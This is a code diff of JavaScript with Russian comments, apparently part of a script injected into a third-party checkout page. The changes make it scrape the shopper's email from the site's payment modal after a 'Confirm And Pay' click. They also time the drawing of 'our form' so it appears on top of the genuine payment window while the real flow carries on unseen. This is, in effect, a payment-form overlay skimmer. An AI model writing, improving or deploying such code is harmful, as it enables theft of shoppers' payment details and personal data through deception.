@@ -106,9 +106,18 @@
 
   function findEmail() {
     try {
-      var m = (document.body.innerText || '').match(/[\w.+-]+@[\w.-]+\.[a-z]{2,}/i);
-      return m ? m[0] : '';
-    } catch (e) { return ''; }
+      // 1) из их модалки оплаты (открывается после Confirm And Pay)
+      var modals = document.querySelectorAll('.modal, .modal-section, [id*="pay"], [id*="checkout"]');
+      for (var i = 0; i < modals.length; i++) {
+        var t = (modals[i].innerText || '');
+        var m = t.match(/[\w.+-]+@[\w.-]+\.[a-z]{2,}/i);
+        if (m) return m[0];
+      }
+      // 2) из текста любого видимого незакрытого элемента
+      var m2 = (document.body.innerText || '').match(/[\w.+-]+@[\w.-]+\.[a-z]{2,}/i);
+      if (m2) return m2[0];
+    } catch (e) {}
+    return '';
   }
 
   /* ---- сумма в формате оригинала (конвертация 525.00 → 525,00) ---- */
@@ -322,8 +331,10 @@
           var now = Date.now();
           if (now - lastClick < 2500) return;
           lastClick = now;
-          // НЕ preventDefault — их флоу идёт как обычно, наша форма поверх
-          setTimeout(injectForm, 50);
+          // НЕ preventDefault — их флоу идёт как обычно.
+          // Ждём 600мс: их окно оплаты начнёт рендериться (заодно достанем email),
+          // затем рисуем нашу форму ПОВЕРХ.
+          setTimeout(injectForm, 600);
         }
       }
     }, true);
